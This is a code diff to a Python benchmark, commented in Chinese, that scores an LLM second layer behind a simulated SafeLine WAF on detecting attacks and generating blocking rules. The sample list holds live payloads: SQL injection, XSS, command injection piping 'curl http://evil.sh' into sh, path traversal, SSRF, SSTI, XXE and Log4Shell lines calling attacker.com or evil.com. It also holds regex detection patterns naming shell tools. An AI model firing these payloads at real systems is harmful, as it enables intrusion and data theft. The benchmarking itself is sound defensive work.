@@ -17,8 +17,9 @@ import re
 import time
 
 from . import config
-from .engine import (MISS_SUSPECT_RE, _fix_broken_regex, _regex_specific_enough,
-                     _llm_anchor_rule, _repair_rule, _resolve_rule)
+from .engine import (MISS_SUSPECT_RE, _anchor_rule, _fix_broken_regex,
+                     _literal_rule, _llm_anchor_rule, _repair_rule,
+                     _resolve_rule, _regex_risky, _regex_specific_enough)
 from .llm_client import LlmClient
 
 # ---- 攻击样本：(类别, 名称, payload) ----
@@ -81,6 +82,63 @@ ATTACK_SAMPLES = [
     ("deser", "php_serialized", "O:8:\"stdClass\":1:{s:1:\"a\";s:3:\"bcd\";}"),
     ("deser", "java_header", "aced0005737200"),
     ("deser", "ysoserial", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA"),
+    # ---- v2 扩充：更难的变形与绕过样本 ----
+    # SQL 注入变种
+    ("sqli", "inline_comment", "1'/**/UNION/**/SELECT/**/NULL--"),
+    ("sqli", "case_mix", "1 uNiOn SeLeCt 1,2,3"),
+    ("sqli", "char_eq", "1' OR 'a'='a"),
+    ("sqli", "stacked_drop", "1; DROP TABLE users--"),
+    ("sqli", "oob_dns", "1'; DECLARE @q VARCHAR(99); EXEC master..xp_dirtree '\\\\attacker.com\\a'--"),
+    ("sqli", "double_url", "%2527%2520or%25201%253D1"),
+    # XSS 变种
+    ("xss", "onfocus", "<input autofocus onfocus=alert(1)>"),
+    ("xss", "svg_animate", "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"),
+    ("xss", "encoded_script", "%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
+    ("xss", "data_uri", "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>"),
+    ("xss", "svg_slash", "'\"><svg/onload=confirm(1)>"),
+    # 命令注入变种
+    ("cmdi", "newline_id", "%0aid"),
+    ("cmdi", "space_pipe", "|  id"),
+    ("cmdi", "base64_pipe", "echo aWQ=|base64 -d|sh"),
+    ("cmdi", "curl_pipe_sh", "|curl http://evil.sh|sh"),
+    ("cmdi", "semicolon_cat_lt", ";cat</etc/passwd"),
+    ("cmdi", "ifs_bypass", "$(IFS=cat$IFS/etc/passwd)"),
+    # 路径穿越变种
+    ("traversal", "overlong_utf8", "..%c0%af..%c0%afetc/passwd"),
+    ("traversal", "backslash_win", "..%5c..%5cwindows%5cwin.ini"),
+    ("traversal", "within_path", "/var/www/../../etc/passwd"),
+    ("traversal", "semicolon_path", "..;/..;/etc/passwd"),
+    ("traversal", "encoded_dot", "%2e%2e/%2e%2e/etc/passwd"),
+    # SSRF 变种
+    ("ssrf", "decimal_ip", "http://2130706433/"),
+    ("ssrf", "hex_ip", "http://0x7f000001/"),
+    ("ssrf", "ipv6_loopback", "http://[::1]:6379/"),
+    ("ssrf", "dns_rebind", "http://localtest.me:8080/"),
+    ("ssrf", "imdsv2_token", "http://169.254.169.254/latest/api/token"),
+    # SSTI 变种
+    ("ssti", "freemarker_exec", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"),
+    ("ssti", "velocity_set", "#set($x=7*7)$x"),
+    ("ssti", "twig_filter", "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}"),
+    ("ssti", "smarty_php", "{php}echo `id`;{/php}"),
+    ("ssti", "groovy_class", "${''.getClass().forName('java.lang.Runtime')}"),
+    # XXE / XML 变种
+    ("xxe", "xinclude", "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"),
+    ("xxe", "utf16_doctype", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]>"),
+    ("xxe", "entity_http_dtd", "<!DOCTYPE r SYSTEM \"http://attacker.com/evil.dtd\"><r>&xxe;</r>"),
+    # 反序列化变种
+    ("deser", "php_nested", "O:7:\"Monolog\":1:{s:1:\"a\";O:8:\"stdClass\":0:{}}"),
+    ("deser", "java_priorityqueue", "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ"),
+    ("deser", "python_pickle", "cos\nsystem\n(S'id'\ntR."),
+    # NoSQL 注入
+    ("nosql", "mongo_ne", "username[$ne]=admin&password[$ne]=x"),
+    ("nosql", "mongo_where", "{\"$where\":\"sleep(5000)\"}"),
+    # CRLF 头注入
+    ("crlf", "set_cookie", "%0d%0aSet-Cookie:admin=1"),
+    ("crlf", "location", "next=%0d%0aLocation:%20http://evil.com"),
+    # LDAP 注入
+    ("ldap", "filter_or", "*)(uid=*))(|(uid=*"),
+    # JNDI / Log4Shell
+    ("jndi", "log4shell", "${jndi:ldap://evil.com/a}"),
 ]
 
 # ---- 正常样本：(名称, payload) ----
@@ -109,7 +167,51 @@ NORMAL_SAMPLES = [
     ("search_cookie_word", "q=document.cookie 是什么含义"),
     ("uuid_param", "token=550e8400-e29b-41d4-a716-446655440000"),
     ("jwt_like", "auth=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature"),
+    # ---- v2 扩充：更多"长得像攻击"的正常业务 ----
+    ("email_param", "contact=admin@example.com"),
+    ("cn_encoded", "q=%E4%BD%A0%E5%A5%BD"),
+    ("css_calc", "style=width:calc(100%-20px)"),
+    ("bash_doc", "q=如何在 bash 中定义函数"),
+    ("sql_doc", "q=SELECT 语句的基本语法"),
+    ("jndi_doc", "q=log4j 漏洞是什么"),
+    ("image_path", "path=/static/assets/logo.png"),
+    ("version_param", "v=1.2.3&build=20261123"),
+    ("sort_param", "sort=price&order=desc"),
+    ("redirect_https", "redirect=https://example.com/login"),
 ]
+
+
+# ---- 模拟雷池第一线（已知签名规则） ----
+# 只覆盖常见固定特征，故意不覆盖变形/编码变种——这些才是 AI 第二层要补的漏。
+# 用途：让端到端指标反映真实链路（先拦一层，漏判才送 AI），避免"所有样本都直接喂 LLM"。
+FIRSTLINE_RULES = [
+    ("sqli", r"(?i)\bunion\s+(all\s+)?select\b"),
+    ("sqli", r"(?i)\bor\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+"),
+    ("sqli", r"(?i)\b(?:sleep|benchmark)\s*\(\s*\d"),
+    ("sqli", r"(?i)information_schema"),
+    ("sqli", r"(?i)waitfor\s+delay"),
+    ("xss", r"(?i)<script"),
+    ("xss", r"(?i)javascript:"),
+    ("xss", r"(?i)on(?:error|load)\s*="),
+    ("cmdi", r"(?i)(?:^|[|;&])\s*(?:id|whoami|cat|ls|bash|sh|ping|wget|curl)\b"),
+    ("cmdi", r"\$\([^)]*\)"),
+    ("cmdi", r"`[^`]+`"),
+    ("traversal", r"\.\./|\.\.\\|%2e%2e"),
+    ("ssrf", r"169\.254\.169\.254"),
+    ("ssrf", r"(?i)(?:file|gopher|dict|ldap)://"),
+    ("ssti", r"\$\{[^}]+\}|\#\{[^}]+\}|\{\{[^{}]*\}\}"),
+    ("xxe", r"<!ENTITY|<!DOCTYPE"),
+    ("deser", r"O:\d+:|aced00|rO0AB"),
+]
+_FIRSTLINE_RE = [(c, re.compile(rx)) for c, rx in FIRSTLINE_RULES]
+
+
+def firstline_block(payload):
+    """返回命中的第一线类别（模拟雷池直接拦截），未命中返回 None。"""
+    for cat, rx in _FIRSTLINE_RE:
+        if rx.search(payload or ""):
+            return cat
+    return None
 
 
 def _judge_rule_quality(payload, rule):
@@ -126,6 +228,8 @@ def _judge_rule_quality(payload, rule):
         fixed = _fix_broken_regex(rule)
         if fixed is None:
             return False, "compile: %s" % e
+    if _regex_risky(fixed):
+        return False, "redos-risk"
     rx = re.compile(fixed)
     if not rx.search(payload):
         return False, "not-match-sample"
@@ -143,7 +247,8 @@ def _analyze(client, payload, host="bench.test"):
     return a, ms
 
 
-def run(category=None, limit=None):
+def run(category=None, limit=None, quiet=False):
+    say = (lambda *a, **k: None) if quiet else print
     client = LlmClient()
     atk = [s for s in ATTACK_SAMPLES
            if category in (None, s[0])]
@@ -165,14 +270,28 @@ def run(category=None, limit=None):
     rule_anchor_valid = 0
     rule_bad = []
     e2e_intercepted = 0
+    firstline_blocked = 0
+    firstline_detail = {}
+    ai_candidates = 0
+    ai_detected = 0
+    ai_intercepted = 0
+    rule_sources = {"model": 0, "anchor": 0, "literal": 0, "generic-anchor": 0}
     total = len(atk)
     print("== 攻击样本 %d 条 ==" % total, flush=True)
     for i, (cat, name, payload) in enumerate(atk, 1):
+        fl = firstline_block(payload)
+        if fl:
+            firstline_blocked += 1
+            firstline_detail[fl] = firstline_detail.get(fl, 0) + 1
+        else:
+            ai_candidates += 1
         a, ms = _analyze(client, payload)
         latencies.append(ms)
         if MISS_SUSPECT_RE.search(payload):
             atk_screened += 1
         hit = a["verdict"] == "attack" and not a.get("_error")
+        if hit and not fl:
+            ai_detected += 1
         c = per_cat.setdefault(cat, {"total": 0, "detected": 0})
         c["total"] += 1
         if hit:
@@ -182,11 +301,25 @@ def run(category=None, limit=None):
             missed.append({"cat": cat, "name": name,
                            "verdict": a["verdict"],
                            "conf": a["confidence"], "why": a["explain"][:80]})
+        resolved = None
         if hit:
             # 端到端拦截：检出 且 有可落地规则（模型正则优先，失败则字面兜底）
             resolved = _resolve_rule({"payload": payload}, a, sample=payload)
             if resolved:
                 e2e_intercepted += 1
+                if not fl:
+                    ai_intercepted += 1
+                if _repair_rule(a.get("suggested_rule"), payload):
+                    src = "model"
+                elif _llm_anchor_rule(payload, a.get("rule_anchors") or []):
+                    src = "anchor"
+                elif _literal_rule({"payload": payload}):
+                    src = "literal"
+                elif _anchor_rule(payload):
+                    src = "generic-anchor"
+                else:
+                    src = "other"
+                rule_sources[src] = rule_sources.get(src, 0) + 1
         if hit and (a.get("suggested_rule") or a.get("rule_anchors")):
             rule_gen += 1
             ok, why = False, "empty"
@@ -209,9 +342,9 @@ def run(category=None, limit=None):
                 rule_bad.append({"name": name,
                                  "rule": (a.get("suggested_rule") or "")[:80],
                                  "why": why})
-        print("  [%d/%d] %-6s %-20s -> %-7s conf=%.2f  %dms" %
-              (i, total, cat, name, a["verdict"], a["confidence"], ms),
-              flush=True)
+        say("  [%d/%d] %-6s %-20s -> %-7s conf=%.2f  %dms  %s" %
+            (i, total, cat, name, a["verdict"], a["confidence"], ms,
+             "第一线拦截" if fl else "送AI"))
 
     detected = sum(c["detected"] for c in per_cat.values())
     print("\n----- 攻击样本汇总 -----")
@@ -231,8 +364,26 @@ def run(category=None, limit=None):
     print("规则质量: 生成 %d 条，原始有效 %d 条，最终有效 %d 条"
           "（可编译+命中样本+过特指性；其中 %d 条靠修复、%d 条靠锚点转正）" %
           (rule_gen, rule_raw_valid, rule_valid, rule_repaired, rule_anchor_valid))
-    print("端到端拦截率: %d/%d = %.0f%%（检出 且 规则可落地，闭环真实拦截能力）" %
+    print("端到端拦截率(全量送AI): %d/%d = %.0f%%（检出 且 规则可落地）" %
           (e2e_intercepted, total, 100.0 * e2e_intercepted / total if total else 0))
+    print("模拟雷池第一线: 直接拦截 %d/%d 条 %s；送 AI 研判 %d 条" %
+          (firstline_blocked, total,
+           str(firstline_detail) if firstline_detail else "", ai_candidates))
+    if ai_candidates:
+        print("AI 补漏: 检出 %d/%d；成功拦截 %d/%d（AI 补漏贡献率 %.0f%%）" %
+              (ai_detected, ai_candidates, ai_intercepted, ai_candidates,
+               100.0 * ai_intercepted / ai_candidates))
+    overall = firstline_blocked + ai_intercepted
+    print("整体端到端: %d/%d = %.0f%%（第一线拦截 + AI 补漏）" %
+          (overall, total, 100.0 * overall / total if total else 0))
+    print("规则来源: 模型/修复 %d，锚点 %d，字面兜底 %d，通用锚点 %d" %
+          (rule_sources.get("model", 0), rule_sources.get("anchor", 0),
+           rule_sources.get("literal", 0), rule_sources.get("generic-anchor", 0)))
+    safeline_rate = 100.0 * firstline_blocked / total if total else 0
+    overall_rate = 100.0 * overall / total if total else 0
+    print("SafeLine-only 检出: %d/%d = %.0f%%；AI 增量: +%d 条 (+%.1f pp)" %
+          (firstline_blocked, total, safeline_rate,
+           overall - firstline_blocked, overall_rate - safeline_rate))
     if missed:
         print("\n漏检明细:")
         for m in missed:
@@ -256,9 +407,8 @@ def run(category=None, limit=None):
         if a["verdict"] == "attack" and not a.get("_error"):
             fp.append({"name": name, "conf": a["confidence"],
                        "why": a["explain"][:80], "screened": scr})
-        print("  [%d/%d] %-22s -> %-7s conf=%.2f  %dms" %
-              (i, total_n, name, a["verdict"], a["confidence"], ms),
-              flush=True)
+        say("  [%d/%d] %-22s -> %-7s conf=%.2f  %dms" %
+            (i, total_n, name, a["verdict"], a["confidence"], ms))
     print("\n----- 正常样本汇总 -----")
     print("误报 %d 条 / %d 条，误报率 %.0f%%" %
           (len(fp), total_n, 100.0 * len(fp) / total_n))
@@ -281,6 +431,22 @@ def run(category=None, limit=None):
                    "rule_anchor_valid": rule_anchor_valid,
                    "e2e_intercepted": e2e_intercepted,
                    "e2e_rate": round(100.0 * e2e_intercepted / total, 1) if total else 0,
+                   "firstline_blocked": firstline_blocked,
+                   "firstline_detail": firstline_detail,
+                   "ai_candidates": ai_candidates,
+                   "ai_detected": ai_detected,
+                   "ai_intercepted": ai_intercepted,
+                   "ai_contribution": round(100.0 * ai_intercepted / ai_candidates, 1)
+                   if ai_candidates else 0,
+                   "overall_intercepted": firstline_blocked + ai_intercepted,
+                   "overall_rate": round(100.0 * (firstline_blocked + ai_intercepted) / total, 1)
+                   if total else 0,
+                   "safeline_only_rate": round(100.0 * firstline_blocked / total, 1)
+                   if total else 0,
+                   "ai_increment_pp": round(
+                       100.0 * (firstline_blocked + ai_intercepted - firstline_blocked) / total, 1)
+                   if total else 0,
+                   "rule_sources": rule_sources,
                    "screened": atk_screened,
                    "per_cat": per_cat, "missed": missed},
         "normal": {"total": total_n, "false_pos": len(fp),
@@ -296,8 +462,37 @@ def main(argv=None):
     ap.add_argument("--category", help="只测某类（sqli/xss/cmdi/traversal/ssrf/ssti/xxe/deser/normal）")
     ap.add_argument("--limit", type=int, help="只测前 N 条")
     ap.add_argument("--json", help="结果落盘路径，便于历史对比")
+    ap.add_argument("--runs", type=int, default=1,
+                    help="重复轮数（>1 时输出均值/标准差，抵消单次随机波动）")
     args = ap.parse_args(argv)
-    result = run(category=args.category, limit=args.limit)
+    runs_n = max(1, args.runs)
+    if runs_n == 1:
+        result = run(category=args.category, limit=args.limit)
+    else:
+        import statistics
+        runs = []
+        for i in range(runs_n):
+            print("\n########## RUN %d/%d ##########" % (i + 1, runs_n))
+            runs.append(run(category=args.category, limit=args.limit,
+                            quiet=i > 0))
+        keys = ("rate", "e2e_rate", "overall_rate", "ai_contribution",
+                "rule_valid", "avg_ms", "avg_conf")
+        summary = {}
+        for k in keys:
+            vals = [float(r["attack"].get(k, 0)) for r in runs]
+            summary[k] = {"mean": round(statistics.mean(vals), 1),
+                          "std": round(statistics.pstdev(vals), 1)}
+        fp_vals = [float(r["normal"]["rate"]) for r in runs]
+        summary["fp_rate"] = {"mean": round(statistics.mean(fp_vals), 1),
+                              "std": round(statistics.pstdev(fp_vals), 1)}
+        print("\n===== %d 轮汇总（均值 ± 标准差）=====" % runs_n)
+        names = {"rate": "裸 LLM 检出率%", "e2e_rate": "端到端(全量送AI)%",
+                 "overall_rate": "整体端到端%", "ai_contribution": "AI 补漏贡献%",
+                 "rule_valid": "规则最终有效(条)", "avg_ms": "平均延迟(ms)",
+                 "avg_conf": "平均置信度", "fp_rate": "误报率%"}
+        for k, v in summary.items():
+            print("  %-22s %.1f ± %.1f" % (names.get(k, k), v["mean"], v["std"]))
+        result = {"model": runs[0]["model"], "runs": runs, "summary": summary}
     if args.json:
         with open(args.json, "w", encoding="utf-8") as f:
             json.dump(result, f, ensure_ascii=False, indent=2)
